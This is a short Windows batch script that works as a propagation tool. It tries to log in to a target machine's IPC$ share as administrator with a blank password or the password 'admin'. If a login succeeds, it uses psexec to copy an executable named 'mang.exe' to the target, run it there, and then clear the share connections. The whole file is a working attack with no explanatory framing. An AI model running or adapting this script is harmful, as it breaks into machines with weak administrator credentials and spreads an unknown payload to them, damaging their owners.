@echo off
net use /del \\%1\ipc$
net use \\%1\ipc$ "" /user:administrator
if not errorlevel 1 goto a1
net use \\%1\ipc$ "" /user:Administrator
if not errorlevel 1 goto a1
net use \\%1\ipc$ "admin" /user:Administrator
if not errorlevel 1 goto a1
net use \\%1\ipc$ "admin" /user:administrator
if not errorlevel 1 goto a1
goto end
:a1
psexec \\%1 -f -c -d mang.exe -o
psexec \\%1 -d mang.exe -o
goto end
:end
net use /del \\%1\ipc$
net use /del \\%1\c$
exit